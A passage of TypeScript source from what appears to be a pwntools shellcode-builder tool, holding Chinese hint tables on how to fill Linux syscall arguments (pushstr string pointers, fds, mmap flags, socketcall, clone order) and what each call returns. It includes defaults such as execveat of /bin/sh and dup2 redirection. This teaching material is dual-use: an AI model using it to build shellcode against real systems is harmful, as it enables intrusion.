 "lseek:offset":["fix","偏移量（数字，可为负）：从基准位置移动多少字节；回到文件头 = 基准 SEEK_SET + 偏移 0",["0"]],
 "lseek:whence":["cons","基准位置：SEEK_SET=0 从文件头算，SEEK_CUR=1 从当前位置算，SEEK_END=2 从文件末尾算（配偏移 0 可量文件大小）",["0","1","2"]],
 "dup2:oldfd":["rax","已有的 fd：0/1/2，或上一步 open 返回的 fd（在 rax 里）",["'rax'","3","1"]],
 "dup2:newfd":["fix","想复制成的新 fd 号（数字）：如把文件重定向到 stdout 就填 1",["1","2","0"]],
 "dup:oldfd":["rax","已有的 fd：0/1/2 或 open 返回的 fd",["'rax'","3"]],
 "dup:fildes":["rax","已有的 fd：0/1/2 或 open 返回的 fd",["'rax'","3"]],
 "execveat:filename":["str","字符串指针，要执行的程序路径：本页已自动 pushstr（上面框里填，默认 /bin/sh），这里传 'rsp'",["'rsp'"]],
 "mq_open:name":["str","字符串指针，消息队列名（以 / 开头）：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "mq_unlink:name":["str","字符串指针，消息队列名：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]]
};
function genericHint(sys: string, an: string, at: string): Hint {
  var n=an.toLowerCase(), t=(at||"").toLowerCase();
  var isPtr=t.indexOf("*")>=0;
  // 1) 字符串指针：路径/名字类 char* —— 必须 pushstr，绝不是长度
  if(isPtr && t.indexOf("char")>=0 && /name|path|old$|new$|special|_type|description|fs_name/.test(n))
    return ["str","字符串指针，不能直填字符串、更不是长度！先 shellcraft.pushstr('路径') 把字符串压栈，再填 'rsp'（本页对常用路径调用已自动带 pushstr，见上方文件名框）；或填一个已经存好该字符串的地址",["'rsp'"]];
  // 1.5) iovec 表格指针（readv/writev/preadv/process_vm_* 等）：不是数据本身，是小表格的地址
  if(isPtr && t.indexOf("iovec")>=0)
    return ["vec","vec 不是数据本身！它指向一张 iovec 小表格（每行 = 数据地址 + 数据长度），内核照着表格读写。下面面板有现成搭法，搭完填表格地址",["'rsp'"]];
  // 2) 数据缓冲区指针（char*/void* 的 buf）：数据放哪就填哪，不用 pushstr
  if(isPtr && /buf|buff|ubuf|vec|msg_ptr|payload|value|list$/.test(n))
    return ["rax","数据缓冲区指针：填数据所在的内存地址。数据在栈上填 'rsp'，上一步 mmap 返回的地址填 'rax'（或先 mov 保存的寄存器）。这里不是字符串，不用 pushstr",["'rsp'","'rax'","'r13'"]];
  // 3) 其它结构体指针：内核读/写的结构体地址
  if(isPtr)
    return ["rax","结构体指针：填一块可读/可写内存的地址，内核从这里读或往这里写。常用 'rsp'（栈上要留够这个结构体的空间）或 mmap 返回的地址（'rax' / 已保存的寄存器）",["'rsp'","'rax'","'r13'"]];
  // 4) fd 类（nfds/ufds 这类带 fd 字样的不是 fd 本身：nfds 是元素个数、ufds 是结构体指针，都不能先进 fd 规则）
  if(n==="nfds")
    return ["cnt","元素个数，不是字节长度，也不是 fd 编号：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应（只查 1 个 fd 就填 1）",["1","2","3"]];
  if(n==="dfd") return ["fix","目录 fd：相对当前目录填 -100 (AT_FDCWD)；或填上一步 open 打开目录返回的 fd",["-100","'rax'"]];
  if(/fd|fildes/.test(n)) return ["rax","fd 就是一个编号：告诉内核这次要操作哪个已经打开的通道/文件。不用背说明——下面「这个 fd 从哪来？」点一个就自动填好",["0","1","2","'rax'"]];
  // 4.5) 段数（vlen / nr_segs / liovcnt…）：是 iovec 表格有几行，不是字节数，别套长度那套
  if(/^(vlen|nr_segs|liovcnt|riovcnt|iovcnt)$/.test(n))
    return ["cnt","段数，不是字节数！vec 那张表格里有几行就填几：只有一段数据就填 1。下面点选直接填",["1","2","3"]];
  // 4.6) 名字里带 size/count 但根本不是数据长度的：绝不能套长度三选一
  if(n==="sigsetsize")
    return ["fix","固定值，不是长度：sigsetsize = sizeof(kernel_sigset_t)，amd64 和 i386 都是固定 8，填别的会直接 EINVAL；千万别填用户态 sigset_t 的 128。生成器已默认填 8，别改",["8"]];
  if(n==="gidsetsize")
    return ["cnt","元素个数，不是字节长度：grouplist 数组里有几个 gid 就填几，必须和数组里的元素一一对应。setgroups 填 0 = 清空所有附加组；getgroups 先填 0（配 list=NULL）问总数、返回值在 rax 里，再按那个数正式取。别套长度三选一",["0"]];
  if((sys==="eventfd"||sys==="eventfd2") && (n==="count"||n==="initval"))
    return ["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始数，通常填 0。别套长度三选一",["0"]];
  if(n==="sizemask")
    return ["fix","固定值，不是长度：sizemask 和 sigsetsize 一样，都是 sizeof(kernel_sigset_t)，amd64 和 i386 固定 8，填别的会直接 EINVAL；千万别填用户态 sigset_t 的 128",["8"]];
  if(n==="size" && sys==="clone3")
    return ["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本固定 88（0x58）。填大了（尾部非零、或超过一页）会返回 E2BIG，尾部全零的填大能被接受；填小到不足 64（最早版本 VER0 的大小）返回 EINVAL，别套长度三选一",["88"]];
  if(n==="size" && sys==="openat2")
    return ["fix","结构体大小，不是数据长度：size = sizeof(struct open_how)，固定 24（0x18）。别套长度三选一",["24"]];
  if(n==="size" && sys==="bpf")
    return ["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，整个 union 只有一个固定尺寸 144，不分 cmd，别套长度三选一",[]];
  // 4.7) 个数类（nfds/nsops/nsems/nr_*/maxevents…）：是数组/表格里有几个元素，不是字节数，别套长度三选一
  if(/^(nfds|nsops|nsems|nr_events|nr|maxevents|min_nr)$/.test(n) || /^nr_/.test(n))
    return ["cnt","元素个数，不是字节长度：指向的数组/表格里有几个元素就填几（如 poll 的 ufds 数组里有 3 个 pollfd 就填 3，semop 的 sops 数组里有几个操作就填几），必须和你实际准备的元素一一对应。跟数据有多少字节没关系，别套长度三选一",["1","2","3"]];
  // 5) 长度 / 数量 —— 只有这类才是自己定大小
  if(/count|len|size|nbytes|bufsiz|vlen|plen|msgsz/.test(n))
    return ["len","自己定长度/数量：表里这里只给类型（如 size_t），给不出具体数——数取决于你的数据到底有多少字节。按下面三个来源选：跟上一步一样、用上一步返回值、或已知固定长度自己填（如 5 字节字符串填 5）。0x100=256 字节，0x1000=4096（一页）",["0x100","0x1000"]];
  // 6) 权限 mode（umode_t）
  if(n==="mode" && t.indexOf("umode_t")>=0)
    return ["cons","权限位，用八进制填（带 0o 前缀）：每位 = 读4+写2+执行1，三位依次属主/组/其他。0o777=rwxrwxrwx 全开，0o755=rwxr-xr-x，0o644=rw-r--r--，0o600=rw-------",["0o777","0o755","0o644","0o600"]];
  if(n==="mode")
    return ["cons","模式/方式常量：取值看 man 2 "+sys+" 里 mode 的说明，如 access 的 R_OK=4/W_OK=2/X_OK=1/F_OK=0；拿不准在 VM 里 pwn constgrep -c amd64 常量名 查数值，别凭记忆猜",[]];
  // 7) prot / flags / 其它标志位
  if(n==="prot")
    return ["cons","内存保护位（可相加）：PROT_NONE=0, PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4；RWX=7，RW=3，只读=1",["1","3","7"]];
  if(/flags|flag$/.test(n))
    return ["cons","标志位（多个可按位相加）：0 = 无任何标志，通常先填 0；要加标志时看 man 2 "+sys+" 这个参数列出的常量名（如 O_CREAT=0x40、MAP_PRIVATE=2），数值用 pwn constgrep -c amd64 常量名 查了再相加",["0"]];
  if(n==="whence")
    return ["cons","基准位置：SEEK_SET=0 从文件头，SEEK_CUR=1 从当前位置，SEEK_END=2 从文件末尾",["0","1","2"]];
  if(/offset|^off$|pos$/.test(n))
    return ["fix","偏移：一般填 0，表示从文件/数据的开头算起；要跳过前面一段才填具体的字节数",["0"]];
  if(/uid/.test(n)) return ["fix","uid 数字：0=root，1000=常见普通用户（VM 里 id 看自己的）；带 -1 的接口里 -1 表示不改",["0","1000","-1"]];
  if(/gid/.test(n)) return ["fix","gid 数字：0=root 组，1000=常见用户组（VM 里 id 看）；-1 表示不改（限带 -1 语义的接口）",["0","1000","-1"]];
  if(/pid|tid/.test(n)) return ["fix","进程/线程号（数字）：填目标进程的 pid；很多接口里 0 有特殊含义（自己/当前进程组），按 man 2 "+sys+" 确认",["0"]];
  if(/sig$|signo|signal/.test(n)) return ["cons","信号编号：SIGKILL=9（强杀），SIGTERM=15，SIGSTOP=19，SIGCONT=18；完整表在 VM 里 kill -l 查",["9","15","19"]];
  if(/cmd|command/.test(n)) return ["cons","命令常量：每个调用的 cmd 取值不同，看 man 2 "+sys+" 的 cmd 列表（如 fcntl: F_GETFL=3, F_SETFL=4；ioctl 的 cmd 看驱动头文件），再用 pwn constgrep 查数值",[]];
  if(/addr|start|brk|new_addr|shmaddr/.test(n))
    return ["rax","地址：上一步 mmap 返回的地址在 rax 里填 'rax'（用过别的操作先 mov 保存）；让内核选/不指定时填 0",["'rax'","0","'rsp'"]];
  if(/type|how|op$|which|level|optname|protocol|family|clockid|resource|priority|policy|behavior|advice|request/.test(n))
    return ["cons","枚举/类别常量：取值是固定的一组编号，看 man 2 "+sys+" 里这个参数的取值表（如 AF_INET=2、SOCK_STREAM=1），或 pwn constgrep -c amd64 常量名 查，别凭记忆猜",[]];
  return ["fix","数值参数：按 man 2 "+sys+" 里这个参数的说明填数字；是命名常量就先 pwn constgrep 查出数值再填",[]];
}
var SRC_LABEL: Record<string, string> ={fix:"固定值",rax:"上一步 rax / 地址",len:"自己定长度",cons:"常量查表",str:"字符串指针（pushstr）",cnt:"个数（不是字节数）",vec:"iovec 表格地址"};
var RAX_AFTER: Record<string, string> ={
 read:"rax = 实际读到的字节数（出错 = 负的 errno）",
 write:"rax = 实际写出的字节数（出错 = 负的 errno）",
 open:"rax = 新文件的 fd（通常 ≥ 3，出错 = 负的 errno）",
 openat:"rax = 新文件的 fd（通常 ≥ 3，出错 = 负的 errno）",
 mmap:"rax = 映射区的起始地址（不是 fd；fd 参数走的是 r8（i386 的 mmap2 走 edi），调用后还在那个寄存器里；被返回值占掉的是 rax 本身——映射地址之后还要用，先 mov 保存）",
 mprotect:"rax = 0 成功 / 负的 errno",
 close:"rax = 0 成功 / 负的 errno",
 sendfile:"rax = 实际发送的字节数",
 execve:"rax = 成功则不返回（进程已被替换）；返回即失败",
 exit:"不返回（进程结束）", exit_group:"不返回（进程结束）",
 getpid:"rax = 当前进程 PID", getuid:"rax = uid", gettid:"rax = 线程 id",
 chmod:"rax = 0 成功 / 负数 = -errno（如 -EPERM 不是属主）",
 mkdir:"rax = 0 成功 / 负数 = -errno（如 -EEXIST 已存在）",
 unlink:"rax = 0 成功 / 负数 = -errno", rename:"rax = 0 成功 / 负数 = -errno",
 chown:"rax = 0 成功 / 负数 = -errno", access:"rax = 0 = 检查通过 / 负数 = -errno（不行；裸 syscall 不像 libc 那样返回 -1）",
 bpf:"rax = 返回值是否 fd 取决于 cmd：建 map/prog 的 cmd 返回新 fd，其他 cmd 返回 0 或负的 errno，不是 fd"
};
function raxAfter(name: string){var t=RAX_AFTER[name]||"rax = 返回值（成功 ≥ 0，出错 = 负的 errno）";return archText(t);}
HINTS["mmap2:addr"]=["fix","固定值：填 0 让内核自己选地址",["0"]];
HINTS["mmap2:len"]=["len","自己定长度：映射多少字节，一页是 0x1000",["0x1000","0x100"]];
HINTS["mmap2:prot"]=["cons","常量查表：PROT_READ=1, WRITE=2, EXEC=4，可相加，RWX=7",["1","3","7"]];
HINTS["mmap2:flags"]=["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22。注意配对：flags 含 0x20（匿名）时 fd 必须改填 -1，匿名映射不需要 fd；只有文件映射才填 open 返回的 'rax'。",["2","0x22","1"]];
HINTS["mmap2:fd"]=["rax","上一步 rax 返回：open 返回的 fd 还在 rax 里就填 'rax'；匿名映射填 -1",["'rax'","-1","3"]];
HINTS["mmap2:pgoff"]=["fix","偏移，单位是页（0x1000 字节）不是字节：从文件开头映射填 0",["0"]];
RAX_AFTER["mmap2"]="rax = 映射区的起始地址（不是 fd；fd 参数走的是 r8（i386 的 mmap2 走 edi），调用后还在那个寄存器里；被返回值占掉的是 rax 本身——映射地址之后还要用，先 mov 保存）";
HINTS["socketcall:call"]=["cons","多路复用子调用号（i386 老内核没有独立 socket/bind/connect 调用，全走 socketcall）：SYS_SOCKET=1 建套接字, SYS_BIND=2, SYS_CONNECT=3, SYS_LISTEN=4, SYS_ACCEPT=5, SYS_GETSOCKNAME=6, SYS_GETPEERNAME=7, SYS_SOCKETPAIR=8, SYS_SEND=9, SYS_RECV=10, SYS_SENDTO=11, SYS_RECVFROM=12, SYS_SHUTDOWN=13, SYS_SETSOCKOPT=14, SYS_GETSOCKOPT=15, SYS_SENDMSG=16, SYS_RECVMSG=17",["1","3","4","5"]];
HINTS["socketcall:args"]=["rax","参数块指针：socketcall 的第二个参数不是单个值，而是指向一个数组的指针，数组里依次放这个子调用的全部参数。在栈上搭这个数组要倒序压：最后一个参数先压、第一个参数最后压，压完 'rsp' 正好指向第一个参数，再填 'rsp'（正着压参数就全反了）",["'rsp'"]];
HINTS["ipc:call"]=["cons","SysV IPC 多路复用子调用号：SEMOP=1, SEMGET=2, SEMCTL=3, SEMTIMEDOP=4, MSGSND=11, MSGRCV=12, MSGGET=13, MSGCTL=14, SHMAT=21, SHMDT=22, SHMGET=23, SHMCTL=24。i386 新内核（5.1+）也有独立的 semget(393)/msgget(399)/shmget(395) 等号，可以直接搜名字用独立号",["2","13","23"]];
HINTS["ipc:first"]=["fix","第一个参数随子调用变：semget/msgget/shmget 时是 key（如 IPC_PRIVATE=0 或 ftok 生成的 key），拿到 id 之后的操作填那个 id（semid/msgid/shmid）。具体看 man 2 ipc",["0"]];
HINTS["clone:tls"]=["rax","注意：clone 最后两个参数的顺序 amd64 与 i386 正好相反——amd64 是 child_tidptr 在前（第 4 个参数）、tls 最后（第 5 个）；i386 是 tls 在前（第 4 个）、child_tidptr 最后（第 5 个）。本页已按当前架构的顺序排列，照上面 ARG 的顺序填就行，别跨架构照搬",["0"]];
HINTS["clone:child_tidptr"]=["rax","注意：clone 最后两个参数的顺序 amd64 与 i386 正好相反（amd64：child_tidptr 第 4、tls 第 5，child_tidptr 在 tls 前；i386：tls 第 4、child_tidptr 第 5）。本页已按当前架构排列，照 ARG 顺序填。不需要就填 0",["0"]];;
// sigsetsize / gidsetsize / eventfd count：名字带 size/count，但不是数据长度，不给长度三选一
["rt_sigaction","rt_sigprocmask","rt_sigpending","rt_sigtimedwait","rt_sigsuspend","ppoll","epoll_pwait","epoll_pwait2","signalfd","signalfd4"].forEach(function(sn){ HINTS[sn+":sigsetsize"]=["fix","固定值，不是长度：sizeof(kernel_sigset_t)，amd64 和 i386 都是 8，填别的会 EINVAL；千万别填用户态 sigset_t 的 128。本页已默认填 8",["8"]]; });
// signalfd/signalfd4 的这个参数在表里叫 sizemask（不是 sigsetsize）：同样固定 8，上面的 sigsetsize 提示匹配不到它，单独给
HINTS["signalfd:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof(kernel_sigset_t)，amd64 和 i386 都是 8，填别的会 EINVAL；千万别填用户态 sigset_t 的 128。本页已默认填 8",["8"]];
HINTS["signalfd4:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof(kernel_sigset_t)，amd64 和 i386 都是 8，填别的会 EINVAL；千万别填用户态 sigset_t 的 128。本页已默认填 8",["8"]];
// clone3 / openat2 的 size 是结构体大小，不是数据长度
HINTS["clone3:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本（VER2）固定 88（0x58）。填大了（尾部非零、或超过一页）会返回 E2BIG，尾部全零的填大能被接受；填小到不足 64（最早版本 VER0 的大小）返回 EINVAL。本页已默认填 88",["88"]];
HINTS["openat2:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct open_how) = 24（0x18），固定值。本页已默认填 24",["24"]];
HINTS["bpf:size"]=["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，整个 union 只有一个固定尺寸 144，不分 cmd（用哪个成员都不改变 union 的大小），别套长度三选一。注意：bpf 的返回值是不是 fd 也取决于 cmd。",[]];
HINTS["epoll_create:size"]=["fix","遗留参数，不是长度：自 Linux 2.6.8 起 size 已被内核忽略，只要求大于 0（填 0 或负数会 EINVAL），填 1 即可；不要按“要监听几个 fd”去估算，也不要套长度三选一。本页已默认填 1",["1"]];
// 个数类：是数组/表格的元素个数，不是字节长度，不给长度三选一
HINTS["poll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应（只查 1 个 fd 就填 1）。跟每个 fd 上有多少数据没关系",["1","2","3"]];
HINTS["ppoll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应",["1","2","3"]];
HINTS["semop:nsops"]=["cnt","元素个数，不是字节长度：sops 数组里有几个 sembuf 操作就填几，必须一一对应；只做一个操作就填 1",["1","2"]];
HINTS["semtimedop:nsops"]=["cnt","元素个数，不是字节长度：sops 数组里有几个 sembuf 操作就填几，必须一一对应",["1","2"]];
HINTS["semget:nsems"]=["cnt","元素个数，不是字节长度：这个信号量集合里要有几个信号量就填几（新建时）；打开已有集合时填 0",["1","0"]];
HINTS["io_setup:nr_events"]=["cnt","个数，不是字节长度：最多同时挂起几个异步 I/O 事件（aio_context 的容量），如 8 / 128。和要读写的数据有多少字节没关系",["8","128"]];
HINTS["epoll_wait:maxevents"]=["cnt","个数，不是字节长度：events 数组最多能装几个事件就填几，必须和数组大小一致；填得比数组大内核会写越界",["1","8","64"]];
HINTS["epoll_pwait:maxevents"]=["cnt","个数，不是字节长度：events 数组最多能装几个事件就填几，必须和数组大小一致",["1","8","64"]];
HINTS["epoll_pwait2:maxevents"]=["cnt","个数，不是字节长度：events 数组最多能装几个事件就填几，必须和数组大小一致",["1","8","64"]];
// 之前漏掉自动 pushstr 的字符串参数：sethostname/setdomainname 的 name、fsconfig 的 key、init_module 的 uargs、kexec_file_load 的 cmdline_ptr
HINTS["sethostname:name"]=["str","字符串指针，主机名：本页已自动生成 pushstr（上面框里填主机名），这里传 'rsp'。注意它不靠结尾的 \\0 定界，靠下一个参数 len 说明有多少字节",["'rsp'"]];
HINTS["sethostname:len"]=["fix","主机名的字节数（不含结尾的 \\0）：上面框里填的是几个字符就填几，如 myhost 填 6。它由字符串决定，不是自己随便定的缓冲区长度",["6"]];
HINTS["setdomainname:name"]=["str","字符串指针，域名：本页已自动生成 pushstr（上面框里填域名），这里传 'rsp'。靠下一个参数 len 定界",["'rsp'"]];
HINTS["setdomainname:len"]=["fix","域名的字节数（不含结尾的 \\0）：上面框里填的是几个字符就填几，如 mydomain 填 8",["8"]];
HINTS["fsconfig:key"]=["str","字符串指针 #3，参数名（如给 FSCONFIG_SET_STRING 指定挂载源时 key 填 source）：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。之前这个参数没进自动 pushstr、默认生成 0，等于没给 key",["'rsp'"]];
HINTS["init_module:uargs"]=["str","字符串指针，模块参数字符串（如 debug=1 level=2 这种空格分隔的键值对）：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。没有参数就把上面框留空，这个参数会自动传 0（参数还是自动值时；手动改成别的寄存器时按那个寄存器传）",["'rsp'","0"]];
HINTS["kexec_file_load:cmdline_ptr"]=["str","字符串指针，新内核的启动命令行：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。不需要命令行就把上面框留空，这个参数会自动传 0（参数还是自动值时，cmdline_len 同时填 0；手动改成别的寄存器时按那个寄存器传）",["'rsp'","0"]];
HINTS["kexec_file_load:cmdline_len"]=["fix","cmdline 字符串的字节数：上面框里填了几个字符就填几；框留空（cmdline_ptr 传 0）时这里填 0",["0"]];
HINTS["getgroups:gidsetsize"]=["cnt","元素个数，不是字节长度，必须和 grouplist 数组一一对应。两步 probe 用法：先 getgroups(0, NULL) 只问总数，返回值（gid 个数）在 rax 里；再准备好能装 rax 个 gid 的数组，用那个数做 size 正式调用一次，把组列表取回来",["0"]];
HINTS["setgroups:gidsetsize"]=["cnt","元素个数，不是字节长度：等于你已经在 grouplist 数组里准备好的 gid 个数，必须一一对应；填 0（数组可为 NULL）= 清空所有附加组",["0","1","2"]];
HINTS["eventfd:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。注意 NR 284 的 eventfd 只有这 1 个参数、没有 flags——带 flags 的是 NR 290 eventfd2，别把 libc 包装签名套到 284 上",["0"]];
HINTS["eventfd2:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。flags 是 eventfd2(290) 才有的第二个参数",["0"]];
HINTS["i386:eventfd:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。注意 NR 323 的 eventfd 只有这 1 个参数、没有 flags——带 flags 的是 NR 328 eventfd2，别把 libc 包装签名套到 323 上",["0"]];
HINTS["i386:eventfd2:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。flags 是 eventfd2(328) 才有的第二个参数",["0"]];
// 多字符串调用：每个字符串都单独 pushstr（mount 三个、xattr 家族两个、add_key/request_key）
HINTS["mount:dev_name"]=["str","字符串指针 #1（源设备/文件系统名，如 tmpfs 就填 tmpfs）：本页自动 pushstr，传 'rsp'。mount 一共有三个字符串，别只压这一个",["'rsp'"]];
HINTS["mount:dir_name"]=["str","字符串指针 #2（挂载点目录，如 /mnt/target，目录要先存在）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑，是 'ebp'）",[]];
HINTS["mount:type"]=["str","字符串指针 #3（文件系统类型，如 tmpfs / ext4）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 没有第二个空闲寄存器，走手动 mov 顺序生成，参数框里填的是暂存寄存器 'edi'，别自己改；dir 留空时生成代码改存 'ebp'，参数框不用跟着改）",[]];
["setxattr","lsetxattr","getxattr","lgetxattr","removexattr","lremovexattr"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑——setxattr/lsetxattr 的 flags 占着 edi，所以挑 'ebp'，别填 'edi'，会被 flags 覆盖）。只压 path 不压 name 的话这个参数会指错地方",[]]; });
["setxattrat","getxattrat","removexattrat"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'）",[]]; });
// setxattrat/getxattrat 的 i386 版是 6 参数（新版 *xattrat 签名多了 at_flags 和 args 结构体指针）：
// 6 个参数寄存器全被占，没有空闲保存寄存器，name 直接进它自己的最终参数寄存器 esi（见 multiCanon 的退路）。
// removexattrat 只有 4 个参数，ebp 空闲，走正常保存寄存器，不受影响。
HINTS["setxattrat:name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 下这个调用 6 个参数占满寄存器、没有空闲保存寄存器，name 压栈后直接 mov esi, esp，进它自己的参数寄存器传 'esi'，setregs 会跳过这一步）",[]];
HINTS["getxattrat:name"]=HINTS["setxattrat:name"];
HINTS["add_key:_type"]=["str","字符串指针 #1（key 类型，如 user / keyring）：本页自动 pushstr，传 'rsp'",["'rsp'"]];
HINTS["add_key:_description"]=["str","字符串指针 #2（key 的名字）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 是 'ebp'——add_key 的 keyring 参数占着 edi）",[]];
HINTS["request_key:_type"]=["str","字符串指针 #1（key 类型，如 user）：本页自动 pushstr，传 'rsp'",["'rsp'"]];
HINTS["request_key:_description"]=["str","字符串指针 #2（key 的名字）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 是 'ebp'）",[]];
HINTS["request_key:_callout_info"]=["str","字符串指针 #3（callout 信息，没有就留空这个框、参数填 0）：框里留空时生成器会自动把这个参数传 0（参数还是自动值时；手动改成别的寄存器时按那个寄存器传），不会连累前两个字符串的 pushstr；要用时填上，本页会先 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 是 'edi'，这个调用只用 4 个参数、edi 空闲）",["0"]];
// mount 的 data / xattr 的 value：不在自动 pushstr 范围内，明确标手动处理
HINTS["mount:data"]=["rax","手动处理，不自动 pushstr：data 是文件系统私有的选项（如 tmpfs 的 size=16M 文本）。默认填 0 = 无附加选项，没问题；想传文本要自己多压一个 pushstr、把地址存进一个寄存器（如 mov r15, rsp）再填那个寄存器——本页只自动压 dev_name / dir_name / type 三个字符串，这第 4 个不自动",["0"]];
HINTS["setxattr:value"]=["rax","手动处理，不自动 pushstr：本页只自动压 path 和 name 两个字符串。value 是属性值数据所在的地址：默认填 0 且 size 填 0 = 写一个空值；想写文本值，要自己先 pushstr 那段文本、把地址存进寄存器（如 r15）再填，或填数据本来所在的内存地址",["0"]];
HINTS["lsetxattr:value"]=["rax","手动处理，不自动 pushstr：本页只自动压 path 和 name 两个字符串。value 默认填 0 且 size 填 0 = 写空值；想写文本值要自己 pushstr 后把地址存进寄存器（如 r15）再填",["0"]];
HINTS["fsetxattr:value"]=["rax","手动处理，不自动 pushstr：本页只自动压 name 这一个字符串（fsetxattr 只有 name 是字符串，path 是 fd 不是字符串）。value 默认填 0 且 size 填 0 = 写空值；想写文本值要自己 pushstr 后把地址存进寄存器（如 r15）再填",["0"]];
HINTS["mmap2:pgoff"]=["fix","偏移单位是页（0x1000 字节），不是字节：想从文件第 0x2000 字节映射，这里填 2；从开头填 0",["0"]];
HINTS["pipe:fildes"]=["rax","输出数组指针，不是 fd 本身：fildes 指向一块能放 2 个 int 的内存（栈上填 'rsp' 就行）。成功后内核把两个 fd 写进这块内存：fildes[0]=读端，fildes[1]=写端。fd 不在 rax 里，别去 rax 里找",["'rsp'"]];
HINTS["pipe2:fildes"]=["rax","输出数组指针：和 pipe 一样，fildes 指向能放 2 个 int 的内存（填 'rsp'）。成功后 fildes[0]=读端、fildes[1]=写端 都写在这块内存里，rax 只是 0",["'rsp'"]];
HINTS["pipe2:flags"]=["cons","标志位：0 = 无；O_CLOEXEC=0x80000（exec 时自动关）、O_NONBLOCK=0x800（非阻塞），可相加",["0","0x80000"]];
RAX_AFTER["pipe"]="rax = 0 成功 / 负数 = -errno；两个新 fd 不在 rax 里，在 fildes 指向的数组里：[0]=读端，[1]=写端";
RAX_AFTER["pipe2"]="rax = 0 成功 / 负数 = -errno；两个新 fd 不在 rax 里，在 fildes 指向的数组里：[0]=读端，[1]=写端";
RAX_AFTER["open_tree"]="rax = 新的 fd（open_tree 返回的文件描述符）";
RAX_AFTER["fsopen"]="rax = 新的文件系统上下文 fd";
RAX_AFTER["fspick"]="rax = 新的文件系统上下文 fd";
RAX_AFTER["pidfd_open"]="rax = 新的 pidfd";
RAX_AFTER["signalfd"]="rax = 新的 signalfd";
RAX_AFTER["signalfd4"]="rax = 新的 signalfd";
RAX_AFTER["userfaultfd"]="rax = 新的 userfaultfd";
RAX_AFTER["landlock_create_ruleset"]="rax = 新的 landlock ruleset fd";
RAX_AFTER["inotify_init1"]="rax = 新的 inotify fd";
RAX_AFTER["pidfd_getfd"]="rax = 新的 fd（从目标进程复制来的 fd）";
RAX_AFTER["io_uring_setup"]="rax = 新的 io_uring fd";
RAX_AFTER["fanotify_init"]="rax = 新的 fanotify fd";
RAX_AFTER["brk"]="rax = 新的堆顶地址（brk 返回值）";
RAX_AFTER["mremap"]="rax = 新映射区的起始地址";
RAX_AFTER["shmat"]="rax = 共享内存段的挂接地址";
HINTS["mmap:arg"]=["rax","i386 专属：老式 mmap 只有一个参数，它是指向 mmap_arg_struct 结构体的指针，不是 amd64 的 6 个寄存器参数。结构体里依次是 6 个 4 字节：addr, len, prot, flags, fd, offset。先在栈上按倒序把这 6 个值压好（先压 offset，最后压 addr），栈顶就是结构体地址，这里填 'esp'。填 0 是错的：内核会去地址 0 读结构体，直接出错",["'esp'"]];
HINTS["poll:timeout_msecs"]=["fix","超时时间，单位是毫秒，不是字节长度、更没有三选一：-1 = 一直等到有事件，0 = 立刻返回只看一眼，1000 = 最多等 1 秒",["-1","0","1000"]];
HINTS["epoll_wait:timeout"]=["fix","超时时间，单位是毫秒，不是字节长度：-1 = 一直等，0 = 立刻返回，1000 = 最多等 1 秒",["-1","0","1000"]];
HINTS["epoll_pwait:timeout"]=["fix","超时时间，单位是毫秒，不是字节长度：-1 = 一直等，0 = 立刻返回，1000 = 最多等 1 秒",["-1","0","1000"]];
HINTS["alarm:seconds"]=["fix","多少秒后发 SIGALRM 的秒数，不是字节长度：填 5 就是 5 秒后响，填 0 是取消之前的闹钟",["5","10","0"]];
HINTS["listen:backlog"]=["fix","等待队列的个数，不是字节长度：还没被 accept 的连接最多排队几个，常用 5 或 128；填大了内核也会按上限截断",["5","128"]];


var cur: Syscall | null = null;
var chain: ChainStep[] = [];
var lastFocus: HTMLInputElement | null = null;
var lastLenValue="0x100";
